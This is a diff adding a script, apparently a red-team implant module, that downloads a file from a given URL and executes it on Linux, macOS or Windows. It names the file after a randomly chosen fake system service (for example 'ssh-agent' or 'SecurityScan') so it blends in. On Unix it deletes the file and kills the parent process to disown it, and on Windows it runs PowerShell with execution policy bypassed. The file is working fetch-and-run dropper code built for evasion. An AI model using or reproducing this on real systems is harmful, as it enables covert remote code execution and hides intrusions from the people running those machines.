@@ -1,0 +1,69 @@
+PROC_NAMES = {
+    "PLATFORM_LINUX": ["networkd-dispatcher", "logrotate-daemon", "fs-monitor", "user-session", "dbus-proxy", "cache-cleaner", "cron-helper", "kernel-updater", "process-manager", "disk-watcher", "auth-service", "keyring-agent", "firewall-helper", "app-launcher", "powerd-manager", "pkg-updater", "mount-handler", "journal-writer", "device-watcher", "usb-guard", "x11-display", "wayland-session", "graphics-helper", "audio-manager", "netlink-agent", "storage-monitor", "backup-service", "raid-check", "system-scheduler", "init-helper", "file-watcher", "config-updater", "session-logger", "secure-agent", "env-manager", "core-dump-handler", "cpu-governor", "ram-monitor", "swap-handler", "kernel-debugger", "proxy-service", "mail-notifier", "db-sync", "disk-cleaner", "load-balancer", "dns-helper", "service-manager", "ssh-agent", "vpn-connector", "audit-logger", "temp-monitor", "memory-swapper", "cloud-init", "runtime-agent", "metadata-sync", "time-daemon", "package-manager", "network-check", "process-tracker", "log-watcher", "user-helper", "service-monitor", "queue-manager", "io-tracker", "cgroup-helper", "entropy-pool", "raid-sync", "firmware-updater"],
+    "PLATFORM_WINDOWS": ["SystemUpdater", "DataProtectionHost", "VirtualDisplayManager", "SysCoreService", "DataSyncHost", "NetProxyManager", "UpdateAgent", "SecureVault", "DriverHelper", "TaskQueue", "WinOptimizer", "CloudSyncClient", "MediaControl", "AppLauncher", "BackgroundService", "UserProfileManager", "SystemGuard", "VirtualDiskAgent", "WinCacheHost", "PrintSpoolMonitor", "FileSyncManager", "ProcessScheduler", "EventLogger", "ErrorHandler", "PolicyUpdater", "RegistryHelper", "CoreAppHost", "CredentialManager", "PowerManager", "SessionHelper", "ServiceWorker", "NetworkMonitor", "BackupAgent", "AutoConfigHost", "PerformanceTracker", "LicenseManager", "SearchInrService", "SecurityScan", "ResourceHost", "TelemetryAgent", "ShellHelper", "CommandProcessor", "DiskAnalyzer", "AppDataSync", "ConfigUpdater", "ServiceScheduler", "KernelHelper", "LogCollector", "SystemDiagnostics", "RemoteAgent", "ErrorReporter", "WinServiceHost", "DriverUpdateHelper", "SyncManager", "AutoUpdateAgent", "ProcessMonitor", "EventTracker", "SecureLinkManager", "FirewallAgent", "SessionMonitor", "CrashReporter", "NetConnectHost", "TaskRunner", "ErrorMonitor", "WinAgent", "FileMonitor", "BackgroundOptimizer", "PowerTracker"],
+    "PLATFORM_MACOS": ["CoreSyncAgent", "CloudKeychainProxy", "AppDataService", "SystemProfileHelper", "DiskUtilityAgent", "SpotlightInr", "KeychainManager", "MediaStreamHelper", "DockManager", "FinderSyncHost", "SessionAgent", "PowerMonitor", "BackupScheduler", "AppHelperDaemon", "LoginWindowAgent", "NetworkUtility", "CrashReporter", "BluetoothManager", "KernelEventMonitor", "SystemDiagnosticsAgent", "RemoteDesktopAgent", "NotificationHandler", "SecurityScanHelper", "FileProviderDaemon", "VirtualDiskService", "TimeMachineMonitor", "ResourceTracker", "AccessibilityHelper", "ScreenSharingHelper", "CredentialStore", "ProcessMonitor", "ConfigUpdater", "EnergyUsageMonitor", "FileSyncAgent", "MetadataServer", "WindowServerHelper", "AirDropManager", "AppUpdaterDaemon", "FirewallManager", "DisplayAgent", "SystemLogDaemon", "LocationServicesDaemon", "PrivacyHelper", "AppContainerDaemon", "EventMonitor", "ContentCacheDaemon", "ProcessScheduler", "HandoffAgent", "ClipboardManager", "NetworkMonitorDaemon", "StorageOptimizer", "BackgroundItemsAgent", "CrashLogger", "SandboxHelper", "ServiceWorkerDaemon", "SystemIntegrityAgent", "FileVaultHelper", "TelemetryMonitor", "AutoUpdateManager", "ServiceScheduler", "SessionLogger", "AccessibilityMonitor", "CloudServicesHelper", "LaunchServicesDaemon", "WindowManager", "SystemIdleAgent", "FirewallHelper", "BluetoothEventMonitor"],
+}
+
+
+def get_parent_process(process_name):
+    for cur_proc in process.list():
+        if process_name == cur_proc['name']:
+            return cur_proc['ppid']
+
+
+def http_get_and_execute(url):
+    # Get random process name
+    platform = sys.get_os()["platform"]
+    proc_name = PROC_NAMES[platform][random.int(
+        0, len(PROC_NAMES[platform]))]
+
+    proc_path = "/tmp/"
+    if platform == "PLATFORM_WINDOWS":
+        proc_path = "C:\\Windows\\temp\\"
+
+    if sys.is_linux() or sys.is_macos():
+
+        print(f"Downloading {url} to {proc_path}{proc_name}")
+
+        # Download
+        http.download(url, f"{proc_path}{proc_name}")
+        sys.shell(f"chmod +x {proc_path}{proc_name}")
+        # Execute
+        sys.exec(f"{proc_path}{proc_name}", [], True)
+        # Cleanup
+        file.remove(f"{proc_path}{proc_name}")
+
+        # Kill parent process for clean disown
+        ppid = get_parent_process(proc_name)
+        if ppid != '1' and ppid != process.info()['pid'] and ppid != None:
+            process.kill(ppid)
+        else:
+            print(f"[WARNING] PPID was unexpected: {ppid}")
+
+    elif sys.is_windows():
+        # Set Extension
+        ext = ".exe"
+        if url.endswith(".ps1"):
+            ext = ".ps1"
+        elif url.endswith(".bat"):
+            ext = ".bat"
+
+        # Download
+        print(f"Downloading {url} to {proc_path}{proc_name}{ext}")
+        http.download(url, f"{proc_path}{proc_name}{ext}")
+
+        # Execute
+        if ext == ".ps1":
+            pprint(sys.exec("powershell", [
+                   "-ExecutionPolicy", "Bypass", "-File", f"{proc_path}{proc_name}{ext}"]))
+        else:
+            pprint(sys.exec(f"{proc_path}{proc_name}{ext}", []))
+        # Cleanup
+        file.remove(f"{proc_path}{proc_name}{ext}")
+
+    else:
+        eprint("OS not supported")
+        return
+
+
+http_get_and_execute(input_params['url'])
